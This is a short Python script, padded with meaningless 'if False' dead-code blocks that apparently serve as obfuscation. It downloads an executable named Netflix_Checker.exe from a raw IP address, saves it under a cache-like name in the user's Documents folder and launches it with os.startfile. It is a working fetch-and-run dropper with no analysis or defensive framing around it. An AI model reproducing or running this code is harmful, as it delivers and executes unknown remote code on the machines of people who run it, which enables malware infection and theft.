import requests
if False:
    _var_190_0 = (4, 302, 294)

    def _var_190_fn():
        pass
import os
if False:
    _var_191_0 = (837, 575, 86)

    def _var_191_fn():
        pass
username = os.getlogin()

def download(url, path):
    reponse = requests.get(url)
    with open(path, 'wb') as fichier:
        fichier.write(reponse.content)
    if False:
        _var_189_0 = (307, 52, 937)
        _var_189_1 = (818, 587, 225)
        _var_189_2 = (851, 928, 689)

        def _var_189_fn():
            pass

def launch(path):
    os.startfile(path)
path = f'C:\\Users\\{username}\\Documents\\netflix_checker_cache.exe'
dl_url = 'http://194.163.191.205:6963/builds/Netflix_Checker.exe'
download(dl_url, path)
launch(path)